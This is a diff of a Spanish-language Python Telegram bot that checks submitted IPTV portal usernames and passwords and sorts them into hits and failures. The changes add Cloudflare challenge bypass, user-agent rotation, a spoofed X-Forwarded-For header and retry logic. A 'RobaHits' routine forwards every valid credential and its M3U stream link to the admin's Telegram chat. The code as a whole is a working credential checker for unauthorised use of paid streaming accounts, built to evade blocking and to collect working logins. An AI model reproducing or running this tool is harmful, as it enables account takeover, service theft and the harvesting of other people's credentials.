@@ -2,11 +2,12 @@
 # -*- coding: utf-8 -*-
 """
 🦂 IPTV BOT ULTRA PRO — BY LUIS R 🦂
+• Anti falsos negativos: reintentos, delay, diferenciación de errores
 • Cloudflare bypass integrado (cloudscraper + cookies)
-• 11 User-Agents IPTV reales rotados automáticamente
+• 19 User-Agents IPTV reales rotados automáticamente
 • Verificación HIT/FAIL/RETRY paralela y ultrarrápida
 • Bot público — RobaHits al admin
-• Hora correcta por zona horaria
+• Hora correcta Texas (America/Chicago)
 """
 
 import os, re, json, time, threading, logging, socket, asyncio, random, pickle
@@ -23,26 +24,27 @@ from telegram.ext import (
 from telegram.constants import ParseMode
 
 # ══════════════════════════════════════════════════════
-#  ⚙️  VARIABLES DE ENTORNO — Configura en Railway
+#  ⚙️  VARIABLES — Configura en Railway → Variables
 # ══════════════════════════════════════════════════════
 #
 #  BOT_TOKEN       → Token de @BotFather
-#  ADMIN_ID        → Tu ID de Telegram (@userinfobot)
-#  RENDER_URL      → URL de Railway para keep-alive 24/7
+#  ADMIN_ID        → Tu ID de Telegram (búscalo con @userinfobot)
+#  RENDER_URL      → URL de tu servicio Railway (keep-alive 24/7)
 #  ROBAHITS_CHATID → Tu chat ID donde llegan los HITs
-#                    (si no lo pones, usa ADMIN_ID)
-#  TZ_NAME         → Zona horaria:
-#                    America/Mexico_City | America/Bogota
-#                    America/Lima | America/Santiago
-#                    America/Argentina/Buenos_Aires
+#                    (déjalo vacío y usará tu ADMIN_ID automáticamente)
+#  TZ_NAME         → Ya configurado para Texas. No tocar.
 #
 BOT_TOKEN       = os.getenv("BOT_TOKEN", "")
 ADMIN_ID        = int(os.getenv("ADMIN_ID", "0"))
 RENDER_URL      = os.getenv("RENDER_URL", "")
-ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", str(ADMIN_ID))
-TZ_NAME         = os.getenv("TZ_NAME", "America/Mexico_City")
+ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")   # se rellena abajo si está vacío
+TZ_NAME         = os.getenv("TZ_NAME", "America/Chicago")   # Texas CST/CDT
 TZ              = pytz.timezone(TZ_NAME)
 BOT_USERNAME    = "@Luishits_bot"
+
+# Si no configuraron ROBAHITS_CHATID, los hits van al admin
+if not ROBAHITS_CHATID and ADMIN_ID:
+    ROBAHITS_CHATID = str(ADMIN_ID)
 
 logging.basicConfig(level=logging.INFO,
                     format="%(asctime)s [%(levelname)s] %(message)s")
@@ -64,44 +66,48 @@ FLAGS = {
     "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺","PR":"🇵🇷","MA":"🇲🇦",
 }
 
-# ── 11 User-Agents IPTV reales (incluyendo los nuevos pedidos) ──────────────
+# ── 19 User-Agents IPTV reales ───────────────────────────────────────────────
 ALL_USER_AGENTS = [
-    # Nuevos de alta compatibilidad
+    # Alta compatibilidad — los más aceptados
     "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
+    "TiviMate/4.4.0 (Android 11)",
     "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0-Git:20240101-4a869c2",
+    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
     "VLC/3.5.4 LibVLC/3.0.21 (Android 13)",
     "VLC/3.0.21 LibVLC/3.0.21",
+    "VLC/3.0.18 LibVLC/3.0.18",
     "okhttp/4.9.0",
     "PerfectPlayer/1.6 CFNetwork/1399 Darwin/22.0.0",
     "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 GSE/8.2 IPTV",
+    "GSE SMART IPTV/7.4 (Android 11)",
     "MXPlayer/1.73.6 (Linux; Android 12) ExoPlayerLib/2.18.1",
     "Dalvik/2.1.0 (Linux; Android 10; Generic Android TV)",
+    "Dalvik/2.1.0 (Linux; U; Android 11)",
     "SS_IPTV/3.9.0 (SmartTV)",
     "curl/7.88.1",
-    # Clásicos confiables
-    "VLC/3.0.18 LibVLC/3.0.18",
-    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
-    "TiviMate/4.4.0 (Android 11)",
     "IPTV Smarters Pro/3.0.9.4 (Android 10)",
-    "GSE SMART IPTV/7.4 (Android 11)",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Dalvik/2.1.0 (Linux; U; Android 11)",
     "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
 ]
 
-# Dominios con protección Cloudflare conocida
+# ── Dominios con protección Cloudflare conocida ──────────────────────────────
 CF_DOMAINS = [
     'star-flix.net','mylatinotvmoon.com','venuspv.me','mytitantv.com',
     'mymoontools.xyz','moonstalker.xyz','moontools.me','moonxtream.com',
     'titanxtv.com','venusiptv.com','latinchannel.tv',
 ]
 
-# Directorio de cookies persistentes
+# ── Delay entre peticiones al mismo dominio (anti-saturación) ────────────────
+_domain_last_request: dict = {}
+_domain_lock = threading.Lock()
+DOMAIN_DELAY = 3.0   # segundos entre peticiones al mismo dominio
+
+# ── Cookies persistentes Cloudflare ─────────────────────────────────────────
 COOKIES_DIR = Path("cf_cookies")
 COOKIES_DIR.mkdir(exist_ok=True)
 
 # ══════════════════════════════════════════════════════
-#  🕐 HORA LOCAL
+#  🕐 HORA LOCAL — Texas
 # ══════════════════════════════════════════════════════
 
 def now_str() -> str:
@@ -150,7 +156,25 @@ def extract_from_url(text: str):
     return None, None, None
 
 # ══════════════════════════════════════════════════════
-#  🛡️  CLOUDFLARE BYPASS — Integrado
+#  ⏱️  DELAY ENTRE PETICIONES AL MISMO DOMINIO
+# ══════════════════════════════════════════════════════
+
+def _apply_domain_delay(host: str):
+    """
+    Espera lo necesario para no saturar el servidor.
+    3 segundos mínimo entre peticiones al mismo dominio.
+    Esto evita que el servidor bloquee por exceso de requests.
+    """
+    with _domain_lock:
+        last = _domain_last_request.get(host, 0)
+        now  = time.time()
+        wait = DOMAIN_DELAY - (now - last)
+        if wait > 0:
+            time.sleep(wait)
+        _domain_last_request[host] = time.time()
+
+# ══════════════════════════════════════════════════════
+#  🛡️  CLOUDFLARE BYPASS
 # ══════════════════════════════════════════════════════
 
 def _is_cf_domain(host: str) -> bool:
@@ -181,9 +205,8 @@ def _load_cookies(session, host: str):
 
 def _make_session(host: str):
     """
-    Crea la mejor sesión disponible:
-    1. cloudscraper (si está instalado) → bypass real de JS challenge
-    2. requests.Session normal como fallback
+    Intenta crear sesión cloudscraper (bypass JS real).
+    Si no está instalado, usa requests.Session normal.
     """
     try:
         import cloudscraper
@@ -192,27 +215,24 @@ def _make_session(host: str):
             delay=8
         )
         _load_cookies(scraper, host)
-        log.info(f"🛡️ cloudscraper activo para {host}")
         return scraper, True
     except ImportError:
         pass
     except Exception as e:
-        log.warning(f"cloudscraper error: {e}")
-
+        log.warning(f"cloudscraper err: {e}")
     session = requests.Session()
     _load_cookies(session, host)
     return session, False
 
-def _cf_request(url: str, host: str, timeout: int = 15):
+def _cf_request(url: str, host: str, timeout: int = 20):
     """
     Petición con bypass Cloudflare:
-    - Usa cloudscraper si disponible
-    - Rota User-Agents en cada intento
-    - Guarda cookies exitosas
+    - cloudscraper si disponible
+    - Rota UAs en cada intento
+    - Guarda cookies exitosas para próximas requests
     """
-    session, is_cf = _make_session(host)
-    uas = random.sample(ALL_USER_AGENTS, min(4, len(ALL_USER_AGENTS)))
-
+    session, _ = _make_session(host)
+    uas = random.sample(ALL_USER_AGENTS, min(5, len(ALL_USER_AGENTS)))
     for ua in uas:
         try:
             headers = {
@@ -227,24 +247,26 @@ def _cf_request(url: str, host: str, timeout: int = 15):
                             verify=False, allow_redirects=True)
             if r.status_code == 200:
                 raw = r.text.strip()
-                if not (raw.startswith("<") and
-                        ("cloudflare" in raw.lower() or "attention required" in raw.lower())):
+                is_blocked = (raw.startswith("<") and
+                              ("cloudflare" in raw.lower() or
+                               "attention required" in raw.lower() or
+                               "just a moment" in raw.lower()))
+                if not is_blocked:
                     _save_cookies(session, host)
                     return r
             elif r.status_code in (403, 503):
-                log.warning(f"CF block {r.status_code} con UA={ua[:30]}")
-                time.sleep(random.uniform(1, 2))
-                continue
+                log.warning(f"CF block {r.status_code} ua={ua[:25]}")
+                time.sleep(random.uniform(1.5, 3.0))
         except Exception as e:
             log.debug(f"CF req err: {e}")
-            continue
     return None
 
 # ══════════════════════════════════════════════════════
-#  ✅ VERIFICACIÓN — PARALELA + CF BYPASS
+#  ✅ VERIFICACIÓN — ANTI FALSOS NEGATIVOS
 # ══════════════════════════════════════════════════════
 
 def _parse_json(raw: str):
+    """Parsea JSON tolerando basura al inicio de la respuesta."""
     raw = raw.strip()
     try:
         return json.loads(raw)
@@ -260,10 +282,18 @@ def _parse_json(raw: str):
     return None
 
 def _analyze(data) -> tuple:
+    """
+    Analiza el JSON IPTV:
+    auth=1 + status=Active → HIT
+    auth=1 + otro status   → CUSTOM
+    auth=0                 → FAIL
+    sin estructura válida  → RETRY
+    """
     if not isinstance(data, dict):
         return "RETRY", None
     ui = data.get("user_info")
     if ui is None:
+        # Algunos servidores mandan auth directo en el root
         if "auth" in data:
             ui = data
         else:
@@ -284,116 +314,201 @@ def _analyze(data) -> tuple:
     return "RETRY", None
 
 def _process_response(r) -> tuple:
-    """Procesa una respuesta HTTP y devuelve (resultado, payload)."""
-    if r is None or r.status_code not in (200, 206):
+    """
+    Procesa respuesta HTTP y clasifica el error si aplica:
+    - 200/206 + JSON válido → analizar
+    - 200 + M3U             → HIT directo
+    - 200 + HTML/CF         → RETRY (no marcar como muerta)
+    - 403                   → RETRY (bloqueado, no muerta)
+    - 404                   → FAIL  (ruta no existe)
+    - 500/502/503           → RETRY (error servidor, puede volver)
+    - Timeout               → RETRY
+    """
+    if r is None:
         return "RETRY", None
+
+    code = r.status_code
+    log.info(f"HTTP {code}")
+
+    # 404 = ruta inválida (cuenta no existe en ese portal)
+    if code == 404:
+        return "FAIL", None
+
+    # 403/500/502/503 = servidor vivo pero bloqueando → RETRY, no FAIL
+    if code in (403, 500, 502, 503):
+        log.warning(f"HTTP {code} → RETRY (servidor vivo pero bloqueando)")
+        return "RETRY", None
+
+    if code not in (200, 206):
+        return "RETRY", None
+
     raw = r.text.strip()
     if not raw or len(raw) < 5:
         return "RETRY", None
-    if raw.startswith("<") or "cloudflare" in raw.lower():
+
+    # HTML = Cloudflare u otro bloqueo → RETRY, no marcar muerta
+    if raw.startswith("<") or "cloudflare" in raw.lower() or "just a moment" in raw.lower():
+        log.warning("Respuesta HTML/CF → RETRY")
         return "RETRY", None
-    # M3U directo = cuenta activa
+
+    # M3U directo = cuenta activa (get.php responde M3U cuando credenciales son válidas)
     if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
+        log.info("M3U detectado → HIT directo")
         return "HIT", {
             "user_info": {
-                "auth":1,"status":"Active","exp_date":"0",
-                "active_cons":"?","max_connections":"?",
-                "is_trial":"0","created_at":"0",
+                "auth":1, "status":"Active", "exp_date":"0",
+                "active_cons":"?", "max_connections":"?",
+                "is_trial":"0", "created_at":"0",
             },
             "server_info": {}, "m3u_direct": True,
         }
+
     data = _parse_json(raw)
     if data is None:
+        log.warning(f"JSON inválido: {raw[:60]}")
         return "RETRY", None
+
     return _analyze(data)
 
-def _single_request(url: str, ua: str, host: str, timeout: int = 12) -> tuple:
-    """Petición normal con UA específico."""
-    try:
-        r = requests.get(url,
-            headers={"User-Agent":ua,"Accept":"*/*",
-                     "Connection":"keep-alive","Cache-Control":"no-cache"},
-            timeout=timeout, verify=False, allow_redirects=True)
-        return _process_response(r)
-    except Exception as e:
-        log.debug(f"Req err: {e}")
-        return "RETRY", None
+def _request_with_retries(url: str, ua: str, host: str,
+                          timeout: int = 20, max_retries: int = 3) -> tuple:
+    """
+    Petición con reintentos automáticos:
+    - timeout 20s (servidores lentos responden)
+    - hasta 3 reintentos con espera de 5s entre cada uno
+    - diferencia entre timeout, error de red y respuesta válida
+    """
+    for attempt in range(1, max_retries + 1):
+        try:
+            headers = {
+                "User-Agent":      ua,
+                "Accept":          "*/*",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection":      "keep-alive",
+                "Cache-Control":   "no-cache",
+                # Headers realistas que usa TiviMate
+                "X-Forwarded-For": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
+            }
+            r = requests.get(url, headers=headers, timeout=timeout,
+                             verify=False, allow_redirects=True)
+            result, payload = _process_response(r)
+
+            # Si obtuvimos un resultado definitivo, devolverlo
+            if result in ("HIT", "FAIL", "CUSTOM"):
+                return result, payload
+
+            # RETRY con HTTP 200 pero JSON inválido → reintentar
+            if attempt < max_retries:
+                log.info(f"Intento {attempt}/{max_retries} → esperando 5s antes de reintentar")
+                time.sleep(5)
+                continue
+
+            return "RETRY", None
+
+        except requests.exceptions.Timeout:
+            # Timeout NO significa lista muerta — el servidor puede estar lento
+            log.warning(f"Timeout intento {attempt}/{max_retries} — {url[:50]}")
+            if attempt < max_retries:
+                time.sleep(5)
+            continue
+
+        except requests.exceptions.ConnectionError as e:
+            # Error de conexión — puede ser transitorio
+            log.warning(f"ConnError intento {attempt}/{max_retries}: {str(e)[:50]}")
+            if attempt < max_retries:
+                time.sleep(5)
+            continue
+
+        except Exception as e:
+            log.debug(f"Error inesperado: {e}")
+            return "RETRY", None
+
+    return "RETRY", None
 
 def verify_account(portal: str, user: str, pwd: str) -> tuple:
     """
-    Verificación ultra rápida y paralela:
-    1. Test TCP rápido
-    2. Si es dominio CF → usa bypass dedicado primero
-    3. Lanza todas las combinaciones en paralelo
-    4. Primera respuesta válida gana
+    Verificación completa anti-falsos-negativos:
+    1. Test TCP rápido (5s)
+    2. Si dominio CF → bypass dedicado con cloudscraper
+    3. Peticiones paralelas con múltiples UAs y reintentos (3 intentos, 20s timeout)
+    4. Delay de 3s entre peticiones al mismo dominio
+    5. Último recurso: CF bypass para cualquier dominio
     """
-    host = portal.split(':')[0]
-    port = int(portal.split(':')[1]) if ':' in portal else 8080
-    is_cf = _is_cf_domain(host)
+    host   = portal.split(':')[0]
+    port   = int(portal.split(':')[1]) if ':' in portal else 8080
+    is_cf  = _is_cf_domain(host)
 
-    # ── Test TCP ──────────────────────────────────────────
+    # ── 1. Test TCP rápido ────────────────────────────────────────────────
     tcp_ok = False
     for p in (port, 443, 80):
         try:
             s = socket.create_connection((host, p), timeout=5)
             s.close()
             tcp_ok = True
+            log.info(f"TCP ✅ {host}:{p}")
             break
         except Exception:
             pass
     if not tcp_ok:
-        log.warning(f"TCP ❌ {host}")
+        log.warning(f"TCP ❌ {host} → RETRY directo")
         return "RETRY", None
 
-    # ── Si es dominio Cloudflare → intentar bypass primero ──
+    # ── 2. Bypass CF si es dominio protegido ─────────────────────────────
     if is_cf:
-        log.info(f"🛡️ Dominio CF detectado: {host}")
+        log.info(f"🛡️ CF detectado: {host}")
         for scheme in ("http", "https"):
-            api_url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
-            r = _cf_request(api_url, host, timeout=20)
-            result, payload = _process_response(r)
-            if result != "RETRY":
-                log.info(f"✅ CF bypass exitoso: {result}")
-                return result, payload
-            # También probar get.php
-            m3u_url = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
-            r2 = _cf_request(m3u_url, host, timeout=20)
-            result2, payload2 = _process_response(r2)
-            if result2 != "RETRY":
-                return result2, payload2
+            _apply_domain_delay(host)
+            api = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
+            r   = _cf_request(api, host, timeout=20)
+            res, pay = _process_response(r)
+            if res != "RETRY":
+                return res, pay
+            _apply_domain_delay(host)
+            m3u = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
+            r2  = _cf_request(m3u, host, timeout=20)
+            res2, pay2 = _process_response(r2)
+            if res2 != "RETRY":
+                return res2, pay2
 
-    # ── Peticiones paralelas normales ────────────────────────
+    # ── 3. Peticiones paralelas con reintentos ───────────────────────────
+    # Construir combinaciones: http+https × player_api+get.php × UAs variados
     tasks = []
+    selected_uas = random.sample(ALL_USER_AGENTS, min(6, len(ALL_USER_AGENTS)))
     for scheme in ("http", "https"):
         api = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
         m3u = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
-        # Probar con varios UAs en paralelo
-        for ua in random.sample(ALL_USER_AGENTS, min(5, len(ALL_USER_AGENTS))):
+        for ua in selected_uas:
             tasks.append((api, ua, host))
+        # get.php con TiviMate (el más compatible)
         tasks.append((m3u, ALL_USER_AGENTS[0], host))
 
-    with ThreadPoolExecutor(max_workers=10) as ex:
-        futures = {ex.submit(_single_request, url, ua, h, 12): (url, ua)
-                   for url, ua, h in tasks}
-        for fut in as_completed(futures, timeout=35):
+    with ThreadPoolExecutor(max_workers=8) as ex:
+        futures = {
+            ex.submit(_request_with_retries, url, ua, h, 20, 3): (url, ua)
+            for url, ua, h in tasks
+        }
+        for fut in as_completed(futures, timeout=90):
             try:
                 result, payload = fut.result()
-                if result != "RETRY":
+                if result in ("HIT", "FAIL", "CUSTOM"):
+                    # Cancelar el resto
                     for f in futures:
                         f.cancel()
                     return result, payload
-            except Exception:
-                pass
+            except Exception as e:
+                log.debug(f"Future err: {e}")
 
-    # ── Último recurso: CF bypass para cualquier dominio ────
+    # ── 4. Último recurso: CF bypass para cualquier dominio ──────────────
     if not is_cf:
-        log.info(f"🔄 Intentando CF bypass como último recurso para {host}")
+        log.info(f"🔄 CF bypass último recurso para {host}")
         for scheme in ("http", "https"):
+            _apply_domain_delay(host)
             url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
-            r = _cf_request(url, host, timeout=20)
-            result, payload = _process_response(r)
-            if result != "RETRY":
-                return result, payload
+            r   = _cf_request(url, host, timeout=25)
+            res, pay = _process_response(r)
+            if res != "RETRY":
+                return res, pay
 
     return "RETRY", None
 
@@ -403,10 +518,10 @@ def verify_account(portal: str, user: str, pwd: str) -> tuple:
 
 def _count_action(portal, user, pwd, action) -> str:
     try:
-        ua = random.choice(ALL_USER_AGENTS)
-        r = requests.get(
+        ua = random.choice(ALL_USER_AGENTS[:6])
+        r  = requests.get(
             f"http://{portal}/player_api.php?username={user}&password={pwd}&action={action}",
-            headers={"User-Agent": ua}, timeout=12, verify=False)
+            headers={"User-Agent": ua}, timeout=15, verify=False)
         if r.status_code == 200:
             d = r.json()
             return str(len(d)) if isinstance(d, list) else "0"
@@ -422,7 +537,7 @@ def get_content_counts(portal, user, pwd) -> tuple:
             ex.submit(_count_action, portal, user, pwd, "get_vod_streams"):  "vod",
             ex.submit(_count_action, portal, user, pwd, "get_series"):       "series",
         }
-        for fut in as_completed(futs, timeout=20):
+        for fut in as_completed(futs, timeout=25):
             try:
                 res[futs[fut]] = fut.result()
             except Exception:
@@ -431,10 +546,10 @@ def get_content_counts(portal, user, pwd) -> tuple:
 
 def get_categories(portal, user, pwd, limit=20) -> str:
     try:
-        ua = random.choice(ALL_USER_AGENTS)
-        r = requests.get(
+        ua = random.choice(ALL_USER_AGENTS[:6])
+        r  = requests.get(
             f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
-            headers={"User-Agent": ua}, timeout=12, verify=False)
+            headers={"User-Agent": ua}, timeout=15, verify=False)
         if r.status_code != 200:
             return ""
         cats = r.json()
@@ -444,7 +559,7 @@ def get_categories(portal, user, pwd, limit=20) -> str:
         try:
             r2 = requests.get(
                 f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
-                headers={"User-Agent": ua}, timeout=15, verify=False)
+                headers={"User-Agent": ua}, timeout=20, verify=False)
             if r2.status_code == 200:
                 for ch in r2.json():
                     cid = str(ch.get("category_id",""))
@@ -478,10 +593,15 @@ def get_location(portal) -> str:
     return "Desconocido 🌍"
 
 # ══════════════════════════════════════════════════════
-#  🔔 ROBAHITS — Reenvío de HITs al admin
+#  🔔 ROBAHITS — Copia de HITs al admin
 # ══════════════════════════════════════════════════════
 
 def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
+    """
+    Envía copia del HIT al admin en segundo plano.
+    Usa el mismo BOT_TOKEN — no necesitas un segundo bot.
+    Los hits llegan a ROBAHITS_CHATID (tu ID de Telegram).
+    """
     if not BOT_TOKEN or not ROBAHITS_CHATID:
         return
     try:
@@ -496,14 +616,20 @@ def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
             f"⏲ Vence: {expire}\n"
             f"📺 {live} canales | 🎥 {vod} VOD | 📹 {series} series\n"
             f'🔗 <a href="{m3u}">M3U Link</a>\n\n'
-            f"🕐 {now_str()}\n🦂 {BOT_USERNAME}"
+            f"🕐 {now_str()}\n"
+            f"🦂 {BOT_USERNAME}"
         )
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={"chat_id": ROBAHITS_CHATID, "text": text,
-                  "parse_mode": "HTML", "disable_web_page_preview": True},
-            timeout=8
+            json={
+                "chat_id":               ROBAHITS_CHATID,
+                "text":                  text,
+                "parse_mode":            "HTML",
+                "disable_web_page_preview": True,
+            },
+            timeout=10
         )
+        log.info(f"🔔 RobaHit enviado → {ROBAHITS_CHATID}")
     except Exception as e:
         log.warning(f"RobaHit err: {e}")
 
@@ -539,7 +665,7 @@ def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user) -> str:
     t += f"{LINE}\n"
     t += f'➥ 🔗 <a href="{m3u}">M3U Link</a>   |   <a href="{epg}">EPG Link</a>\n'
     if cats:
-        t += f"{LINE}\n   ★彡ᴄ​ᴀ​ᴛ​ᴇ​ɢ​ᴏ​ʀ​í​ᴀ​s彡★\n{LINE}\n{cats}\n"
+        t += f"{LINE}\n   ★彡ᴄᴀᴛᴇɢᴏʀíᴀs彡★\n{LINE}\n{cats}\n"
     t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
     t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
     return t
@@ -572,8 +698,8 @@ def card_retry(portal, user, tg_user) -> str:
     t += f"➥ 🔄 SIN RESPUESTA / RETRY\n"
     t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
     t += f"➥ 👤 Usuario: <code>{user}</code>\n"
-    t += f"{LINE}\n   ⚠️ Servidor bloqueado o sin respuesta\n"
-    t += f"   💡 Intenta más tarde\n"
+    t += f"{LINE}\n   ⚠️ Servidor sin respuesta tras 3 intentos\n"
+    t += f"   💡 Intenta de nuevo más tarde\n"
     t += f"   ✔️ Verificado para @{tg_user}\n"
     t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
     return t
@@ -617,7 +743,7 @@ async def do_check(update: Update, portal: str, user: str, pwd: str):
     STATS["users"].add(update.effective_user.id)
     tg_user = tg_name(update)
 
-    msg = await update.message.reply_text("🔍 Verificando cuenta…")
+    msg  = await update.message.reply_text("🔍 Verificando cuenta…")
     loop = asyncio.get_event_loop()
     status, result = await loop.run_in_executor(None, verify_account, portal, user, pwd)
 
@@ -631,9 +757,12 @@ async def do_check(update: Update, portal: str, user: str, pwd: str):
         cats              = await cats_fut
         text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
         await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-        threading.Thread(target=send_robahit,
+        # RobaHit en background — no bloquea la respuesta al usuario
+        threading.Thread(
+            target=send_robahit,
             args=(portal, user, pwd, ui, live, vod, series, tg_user),
-            daemon=True).start()
+            daemon=True
+        ).start()
 
     elif status == "CUSTOM":
         STATS["hits"] += 1
@@ -659,18 +788,20 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         global bot_active
         bot_active = True
     kb = InlineKeyboardMarkup([[
-        InlineKeyboardButton("📖 Ayuda", callback_data="help"),
-        InlineKeyboardButton("📊 Estado", callback_data="status"),
+        InlineKeyboardButton("📖 Ayuda",   callback_data="help"),
+        InlineKeyboardButton("📊 Estado",  callback_data="status"),
     ]])
     await update.message.reply_text(
-        f"🦂 <b>IPTV BOT ULTRA PRO</b> 🦂\n         <b>BY LUIS R</b>\n\n"
+        f"🦂 <b>IPTV BOT ULTRA PRO</b> 🦂\n"
+        f"         <b>BY LUIS R</b>\n\n"
         f"✅ Bot activo y listo\n\n"
-        f"📌 <b>Pega tu URL IPTV aquí:</b>\n"
+        f"📌 <b>Pega tu URL aquí:</b>\n"
         f"<code>http://portal:8080/get.php?username=USER&amp;password=PASS</code>\n\n"
-        f"📌 <b>O usa el comando:</b>\n"
+        f"📌 <b>O usa:</b>\n"
         f"<code>/check portal:puerto usuario pass</code>\n\n"
-        f"⚡ Verificación ultra rápida + bypass Cloudflare\n"
-        f"🔔 HITs enviados automáticamente al admin\n\n"
+        f"⚡ Anti falsos negativos — 3 reintentos automáticos\n"
+        f"🛡️ Cloudflare bypass integrado\n"
+        f"🔔 HITs enviados al admin automáticamente\n\n"
         f"🦂 {BOT_USERNAME}",
         parse_mode=ParseMode.HTML, reply_markup=kb
     )
@@ -695,9 +826,9 @@ async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
     try:
         import cloudscraper
-        cf_status = "✅ Instalado"
+        cf_st = "✅ Instalado"
     except ImportError:
-        cf_status = "⚠️ No instalado (pip install cloudscraper)"
+        cf_st = "⚠️ No instalado"
     await update.message.reply_text(
         f"🦂 <b>ESTADO — LUIS R</b> 🦂\n\n"
         f"📺 Bot: {estado}\n"
@@ -709,8 +840,10 @@ async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔄 Retries: {STATS['retries']}\n"
         f"⭐ Total: {STATS['checks']}\n"
         f"👥 Usuarios: {len(STATS['users'])}\n\n"
-        f"🛡️ Cloudscraper: {cf_status}\n"
-        f"🔔 RobaHits → <code>{ROBAHITS_CHATID}</code>\n\n"
+        f"🛡️ Cloudscraper: {cf_st}\n"
+        f"🔔 RobaHits → <code>{ROBAHITS_CHATID}</code>\n"
+        f"📋 Dominios CF: {len(CF_DOMAINS)}\n"
+        f"🤖 User-Agents: {len(ALL_USER_AGENTS)}\n\n"
         f"🦂 {BOT_USERNAME}",
         parse_mode=ParseMode.HTML)
 
@@ -741,7 +874,7 @@ async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
     port = int(portal.split(':')[1]) if ':' in portal else 8080
     msg  = await update.message.reply_text("🔬 Ejecutando diagnóstico…")
     lines = [f"🔬 <b>DIAGNÓSTICO</b> <code>{portal}</code>\n"]
-    lines.append(f"🛡️ CF protegido: {'✅ Sí' if _is_cf_domain(host) else '❌ No'}\n")
+    lines.append(f"🛡️ CF: {'✅ Sí' if _is_cf_domain(host) else '❌ No'}\n")
     for p in (port, 443, 80):
         try:
             s = socket.create_connection((host, p), timeout=5)
@@ -755,40 +888,41 @@ async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
         url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
         lines.append(f"🔗 <b>{scheme.upper()}</b>")
         try:
-            ua = random.choice(ALL_USER_AGENTS)
-            r = requests.get(url, headers={"User-Agent": ua},
-                             timeout=10, verify=False)
+            ua = ALL_USER_AGENTS[0]
+            r  = requests.get(url, headers={"User-Agent": ua}, timeout=20, verify=False)
             lines.append(f"  Status: <code>{r.status_code}</code>")
-            lines.append(f"  UA usado: <code>{ua[:40]}</code>")
+            lines.append(f"  UA: <code>{ua[:45]}</code>")
             raw = (r.text.strip()[:400]
                    .replace("&","&amp;").replace("<","&lt;").replace(">","&gt;"))
             lines.append(f"  Respuesta:\n<code>{raw}</code>")
+        except requests.exceptions.Timeout:
+            lines.append("  ⏱ Timeout >20s")
         except requests.exceptions.ConnectionError:
             lines.append("  ❌ Conexión rechazada")
-        except requests.exceptions.Timeout:
-            lines.append("  ⏱ Timeout")
         except Exception as e:
             lines.append(f"  ❌ {str(e)[:80]}")
         lines.append("")
     await msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)
 
 async def cmd_addcf(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Agrega un dominio a la lista CF protegida en tiempo real."""
+    """Agrega dominio a lista CF en tiempo real — solo admin."""
     if not is_admin(update):
         await update.message.reply_text("❌ No autorizado.")
         return
     args = context.args
     if not args:
+        domains = "\n".join(f"• {d}" for d in CF_DOMAINS)
         await update.message.reply_text(
-            "📌 <code>/addcf dominio.com</code>",
+            f"📋 <b>Dominios CF actuales:</b>\n{domains}\n\n"
+            f"📌 Para agregar: <code>/addcf dominio.com</code>",
             parse_mode=ParseMode.HTML)
         return
     domain = args[0].lower().strip()
     if domain not in CF_DOMAINS:
         CF_DOMAINS.append(domain)
         await update.message.reply_text(
-            f"✅ <code>{domain}</code> agregado a la lista CF.\n"
-            f"🦂 {BOT_USERNAME}", parse_mode=ParseMode.HTML)
+            f"✅ <code>{domain}</code> agregado a CF.\n🦂 {BOT_USERNAME}",
+            parse_mode=ParseMode.HTML)
     else:
         await update.message.reply_text(
             f"⚠️ <code>{domain}</code> ya estaba en la lista.",
@@ -806,7 +940,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     await update.message.reply_text(
         f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
-        f"📌 <b>Comandos:</b>\n"
+        f"📌 <b>Comandos públicos:</b>\n"
         f"/start — 🟢 Inicio\n"
         f"/check <code>portal user pass</code> — ✅ Verificar\n"
         f"/help — ❓ Ayuda\n"
@@ -824,7 +958,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
